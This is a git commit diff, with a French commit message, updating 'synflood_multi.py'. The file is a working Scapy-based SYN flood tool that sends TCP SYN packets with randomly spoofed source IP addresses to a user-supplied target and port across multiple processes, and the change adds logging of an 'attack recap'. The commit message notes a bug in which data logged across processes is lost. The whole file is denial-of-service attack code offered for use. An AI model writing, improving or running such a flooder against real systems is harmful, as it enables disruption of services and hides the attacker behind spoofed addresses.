0eda4e01bb92c25ee757ab4f993c72407b5c9bdf
Macareux-moine <166114484+Macareux-moine@users.noreply.github.com>
2024-04-29 18:31:47 +0200

    Update synflood_multi.py
    avec la prise en charge e la journalisation des donné mais a un probleme car si j'envois 20 paquet avec 10 processu j'ai que 2 donné qui sont conservais et pas 20 probleme avec les multiprocessu.

--- synflood/modules/synflood_multi.py
+++ synflood/modules/synflood_multi.py
@@ -2,34 +2,40 @@ from barre_de_progression import barre
 from scapy.all import *
 import multiprocessing
 from demande_user import DemandeUtilisateur
-
-class ENVOIS:
-
-   
-    def syn(cible, port, nbrpaquet, nbr_processus):
-        # Boucle pour envoyer des paquets SYN
-        packets_per_process = nbrpaquet // nbr_processus
-        for _ in range(nbr_processus):
-            # Création des processus pour envoyer les paquets SYN en parallèle
-            p = multiprocessing.Process(target=ENVOIS.envois, args=(cible, port, packets_per_process))
-            p.start()
+import os
+from journaltest import Journal
 
 
+def envois(cible, port, nbrpaquet, ip_sources, journal):
+    messages = []
+    for _ in range(nbrpaquet):
+        ip_source = str(RandIP())
+        ip_sources.append(ip_source)
+        message = f"Paquet envoyé - IP source: {ip_source}, Port: {port}, Destination: {cible}, Protocole: TCP"
+        print(message)  # Affichage dans la console
+        ip = IP(dst=cible, src=ip_source)
+        tcpsyn = TCP(dport=port, flags="S")
+        send(ip/tcpsyn, verbose=False)
+        messages.append(message)  # Ajouter le message à la liste
+    return messages
 
-        barre(nbrpaquet)
-        
-    def envois(cible, port, nbrpaquet):
-        for _ in range(nbrpaquet):
-            # Création du paquet SYN avec une adresse IP source aléatoire et un numéro de port source aléatoire
-            ip = IP(dst=cible, src=RandIP())  # adresse IP source aléatoire
-            tcpsyn = TCP(dport=port, flags="S")  # paquet TCP avec le flag SYN
-            # Envoie paquet
-            send(ip/tcpsyn, verbose=False)
+def syn(cible, port, nbrpaquet, nbr_processus):
+    packets_per_process = nbrpaquet // nbr_processus
+    ip_sources = []
+    journal = Journal() 
+    messages = envois(cible, port, packets_per_process, ip_sources, journal)  # Appel de la fonction avec les bons arguments
+    for _ in range(nbr_processus):
+        p = multiprocessing.Process(target=envois, args=(cible, port, packets_per_process, ip_sources, journal))
+        p.start()
+
+    barre(nbrpaquet)
+    
+    premier_message = messages[0]  # Choisissez le premier message
+    
+    journal.log_demande(cible, port, nbrpaquet, nbr_processus)  
+    journal.log_recap_attaque(cible, port, nbrpaquet, nbr_processus, messages)
 
 if __name__ == "__main__":
-    # Utilisation de la classe DemandeUtilisateur pour obtenir les informations de l'utilisateur
     demande_utilisateur = DemandeUtilisateur()
     cible, port, nbrpaquet, nbr_processus = demande_utilisateur.obtenir_informations()
-
-    # Appel de la méthode syn de la classe ENVOIS avec les paramètres fournis par l'utilisateur
-    ENVOIS.syn(cible, port, nbrpaquet, nbr_processus)
+    syn(cible, port, nbrpaquet, nbr_processus)
